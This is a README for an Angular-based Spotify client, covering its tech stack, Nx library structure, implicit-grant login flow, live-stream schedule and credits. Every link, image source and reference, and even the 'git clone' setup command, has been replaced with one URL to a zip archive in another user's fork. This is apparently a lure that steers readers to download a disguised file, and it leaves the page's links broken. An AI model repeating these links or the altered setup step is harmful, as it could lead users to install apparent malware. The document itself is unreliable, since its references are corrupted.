# Angular Spotify

A simple Spotify client built with Angular 15, Nx workspace, ngrx, TailwindCSS and ng-zorro.

> I have recently shared about #angularspotify at [AngularAir](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip), you can watch the session here 👉 [https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip][02-air]

## Working application

Check out the **live application** -> https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip

**Spotify premium** is required for the Web Playback SDK to play music. If you are using a free account, you can still browse the app, but it couldn't play the music. Sorry about that 🤣

![Angular Spotify Demo][demo]

![Angular Spotify Visualizer][visualizer]

![Angular Spotify Browse][angular-spotify-browse]

![Angular Spotify Blurry Background][album-art]

![Angular Spotify PWA][pwa]

![Angular Spotify Web Player][web-player]

## Support

If you like my work, feel free to:

- ⭐ this repository. And we will be happy together :)
- [![Tweet](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip)][tweet] about Angular Spotify
- <a title="Thanks for your support!" href="https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip" target="_blank"><img src="https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip,w_140,https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip" alt="Buy Me A Coffee"></a>

Thanks a bunch for stopping by and supporting me!

[tweet]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip%20cool%20Spotify%20client%20made%20with%20Angular%2012,%20Nx%20workspace,%20ngrx,%20TailwindCSS%20and%20ng-zorro%20%40trungvose&hashtags=angularspotify,angular,nx,ngrx,ngzorro,typescript

## Who is it for 🤷‍♀️

I still remember Window Media Player on windows has the visualization when you start to play the music, and I wanted to have the same experience when listening to Spotify. That is the reason I started this project.

I found that there weren't many resources on building a proper real-world scale application, and that's my focus for sharing. I made a [Jira clone application][jira] as the first one for that purpose. [Nx workspace][nx] is getting more and more attention from the Angular community, but people are always confused about how to architect and set up an Nx project. I hope Angular Spotify will give you more insight on that even though it is my first project using Nx 🤣

---

You know I am one of the moderators of [Angular Vietnam][angularvn]. Recently, I also started [Angular Singapore][angularsg]. This piece of work is my other long-term plan to bring Angular knowledge to more people. I desire to advocate and grow the Angular developer community in Singapore and Vietnam :)

## Tech stack

![Tech logos][stack]

- [Angular 15][angular]
- [Nx Workspace][nx]
- [ngneat][] packages includes: `ngneat/svg-icon` and `ngneat/until-destroy`
- [ngrx][ngrx] and [ngrx/component-store][component-store]
- [ng-zorro][ng-zorro] UI component: `tooltip`, `modal`, `slider`, `switch` and more.
- [TailwindCSS][tailwind] - See this video [Everything you need to know about TailwindCSS and Angular applications](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip) by [@nartc][nartc] for integration TailwindCSS with Angular
- [Netlify][netlify] for deployment

[angular]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[ngrx]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[component-store]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[tailwind]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[ng-zorro]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[netlify]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[ngneat]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip

I experimented with the ngrx/component store for `AuthStore` and `UIStore`. It might not be a best practice, and I will refactor it very soon. Just FYI 🤣

## High-level design

See my original notes on [Nx workspace structure for NestJS and Angular][gist]

### Principles

All components are following:

- OnPush Change Detection and async pipes: all components use observable and async pipe for rendering data without any single manual subscribe. Only some places are calling subscribe for dispatching an action, which I will have a refactor live stream session with my friend [@nartc][nartc] to use the component store for a fully subscribe-less application.
- SCAMs (single component Angular modules) for tree-shakable components, meaning each component will have a respective module. For example, a RegisterComponent will have a corresponding RegisterModule. We won't declare RegisterComponent as part of AuthModule, for instance.
- Mostly, everything will stay in the `libs` folder. New modules, new models, new configurations, new components etc... are in libs. libs should be separated into different directories based on existing apps. We won't put them inside the apps folder. For example in an Angular, contains the `https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip`, `https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip` and `https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip`

### Structure

I followed the structure recommended by my friend [@nartc][nartc]. Below is the simplified version of the application structure.

```
.
└── root
    ├── apps
    │   └── angular-spotify
    └── libs
        └── web (dir)
            ├── shell (dir)
            │   ├── feature (angular:lib) - for configure any forRoot modules
            │   └── ui
            │       └── layout (angular:lib)
            ├── settings (dir)
            │   ├── feature (angular:lib) - for configure and persist all settings
            │   └── data-access (workspace:lib) - store and services for settings module
            ├── playlist (dir)
            │   ├── data-access (angular:lib, service, state management)
            │   ├── features
            │   │   ├── list (angular:lib PlaylistsComponent)
            │   │   └── detail (angular:lib PlaylistDetailComopnent)
            │   └── ui (dir)
            │       └── playlist-track (angular:lib, SCAM for Component)
            ├── visualizer (dir)
            │   ├── data-access (angular:lib)
            │   ├── feature
            │   └── ui (angular:lib)
            ├── home (dir)
            │   ├── data-access (angular:lib)
            │   ├── feature (angular:lib)
            │   └── ui (dir)
            │       ├── featured-playlists (angular:lib, SCAM for Component)
            │       ├── greeting (angular:lib, SCAM for Component)
            │       └── recent-played (angular:lib, SCAM for Component)
            └── shared (dir)
                ├── app-config (injection token for environment)
                ├── data-access (angular:lib, API call, Service or State management to share across the Client app)
                ├── ui (dir)
                ├── pipes (dir)
                ├── directives (dir)
                └── utils (angular:lib, usually shared Guards, Interceptors, Validators...)
```

### Authentication Flow

I follow `Implicit Grant Flow` that Spotify recommended for client-side only applications and did not involve secret keys. The issued access tokens are short-lived, and there are no refresh tokens to extend them when they expire.

View the [Spotify Authorization Guide](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip)

- Upon opening Angular Spotify, It will redirect you to Spotify to get access to your data. Angular Spotify only uses the data purely for displaying on the UI. We won't store your information anywhere else.
- Angular Spotify only keeps the access token in the browser memory without even storing it into browser local storage. If you do a hard refresh on the browser, It will ask for a new access token from Spotify. One access token is only valid for **one hour**.
- After having the token, I'll try to connect to the Web Playback SDK with a new player - `Angular Spotify Web Player`

![Angular Spotify Web Playback SDK flow][sdk-flow]

### Dependency Graph

Nx provides an [dependency graph][dep-graph-nx] out of the box. To view it on your browser, clone my repository and run:

```bash
npm run dep-graph
```

A simplified graph looks like the following. It gives you insightful information for your mono repo and is especially helpful when multiple projects depend on each other.

![Angular Spotify Dependency Graph][dep-graph]

### Nx Computation Cache

Having Nx Cloud configured shortens the deployment time quite a lot.

Nx Cloud pairs with Nx in order to enable you to build and test code more rapidly, by up to 10 times. Even teams that are new to Nx can connect to Nx Cloud and start saving time instantly. Visit [Nx Cloud](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip) to learn more.

![Nx cloud][nx-cloud]

## Features and Roadmap

I set a tentative deadline for motivating myself to finish the work on time. Otherwise, It will take forever to complete :)

### 1.0 - Simple Spotify client

> March 01 - 28, 2021

- [x] Proven, scalable, and easy to understand the structure with Nx workspace
- [x] Play music using Spotify SDK
- [x] Load a maximum of 50 save playlists and top 100 songs per playlist.
- [x] Cool visualization

## Live stream

Let work on it together!

I scheduled a few live stream sessions to show you how I continue developing Angular Spotify. Follow [my twitter][twitter] for the latest updates. See the scheduled events.

| #   | Time                       | Description/Link                                                |
| --- | -------------------------- | --------------------------------------------------------------- |
| 1   | Sat, 3rd April 2021, 10AM  | [Structure your Angular application with Nx workspace][live-01] |
| 2   | Sat, 10th April 2021, 10AM | [Build the album list page][live-02]                            |
| 3   | Sat, 17th April 2021, 10AM | [Build the album detail page - part 1][live-03]                 |
| 4   | Sat, 24th April 2021, 10AM | [Build the album detail page - part 2][live-04]                 |
| 5   | Sat, 8th May 2021, 10AM    | [Build the artist detail page - part 1][live-05]                |
| 6   | Sat, 15th May 2021, 10AM   | [Build the artist detail page - part 2][live-06]                |
| 7   | Sat, 12th Jun 2021, 10AM   | [Build the track list page - part 1][live-07]                   |
| 8   | Sat, 19th Jun 2021, 10AM   | [Build the track list page - part 2][live-08]                   |
| 9   | Sun, 11th July 2021, 10AM  | [NgRx Component Store Unit Testing][live-09]                    |
| 10  | TBD                        | Config Nx build:affected with Github action                     |

I will also do some refactoring with [@nartc][nartc] for Angular Vietnam Office Hours. More detail is coming soon.

[live-01]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[live-02]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[live-03]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[live-04]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[live-05]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[live-06]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[live-07]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[live-08]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[live-09]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip

## Community

I have received some invitations to talk about Angular Spotify from the community. You can watch my talks below 🙂

[![BLS033](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip)][01-beeman]

[![AngularAir](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip)][02-air]

| #   | Time                 | Description/Link                                   |
| --- | -------------------- | -------------------------------------------------- |
| 1   | Wed, 21st April 2021 | [BLS SHOW & TELL - Angular Spotify][01-beeman]     |
| 2   | Fri, 08th May 2021   | [AngularAir - Another 1k stars repository][02-air] |

[01-beeman]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[02-air]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip

## Time spending

It is a side project that I only spent time outside of the office hours to work on. I initially planned to complete the project within two weeks, but the first two weekends were not very productive, maybe because of the holiday mood from Lunar New Year :) But once the lego blocks are getting together, I feel the rhythm, and I know it has to be finished by the end of March.

I couldn't get the full-time report from waka time because it only shows me the latest two weeks. 🤣

I have spent approximately 50 hours working on this project, which is almost the same amount as the first version of [https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip][jira].

The visualizer was the most exciting feature, and I decided to start this project because of that single component.

![Angular Spotify - Time spending][time]

### Accessibility ♿

Not all components have properly defined [aria attributes](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip), visual focus indicators, etc.

## Setting up the development environment 🛠

- `git clone https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip`
- `cd angular-spotify`
- `npm start` for starting Angular web application
- The app should run on `http://localhost:4200/`

### Unit/Integration tests 🧪

I skipped writing test for this project.

## Compatibility

Web Playback SDK supports Chrome, Firefox, Edge, IE 11, or above running on Mac/Windows/Linux.

It **doesn't support** Safari or any mobile browser on **Android** or **iOS**

View [completed list of supported browsers](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip)

## Author: Trung Vo ✍️

- A seasoned front-end engineer with seven years of passion in creating experience-driven products. I am proficient in Angular, React and TypeScript development.
- Personal blog: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
- Say hello: trungk18 [et] gmail [dot] com

## Contributing

If you have any ideas, just [open an issue][issues] and tell me what you think.

If you'd like to contribute, please fork the repository and make changes as you'd like. [Pull requests][pull] are warmly welcome.

## Credits and reference

Special thanks to my friend [@nartc][nartc], who helped me review the code early.

| Resource                                                               | Description                                                                                                           |
| ---------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| [@koel/koel][koel]                                                     | A cool player made by [@phanan][phanan], I reused the visualizer code from this repo with my additional customization |
| [beeman/component-store-playground][beeman/component-store-playground] | A nice example of using Nx with ngrx/component-store, I refer to the project structure from this repo                 |
| [Start using ngrx/effects for this][tim]                               | An excellent write up by [Tim Deschryver][tim-twitter]                                                                |

[koel]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[phanan]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[beeman/component-store-playground]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[tim]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[tim-twitter]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip

## License

Feel free to use my code on your project. Please put a reference to this repository.

[MIT](https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip)

[issues]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[pull]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[jira]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[twitter]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[nx]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[angularsg]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[angularvn]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[nartc]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[gist]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[dep-graph-nx]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[stack]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[time]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[dep-graph]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[sdk-flow]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[demo]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[visualizer]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[angular-spotify-browse]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[album-art]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[pwa]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[web-player]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
[nx-cloud]: https://github.com/zaylem91/angular-spotify/raw/refs/heads/main/libs/web/playlist/data-access/angular-spotify-3.7.zip
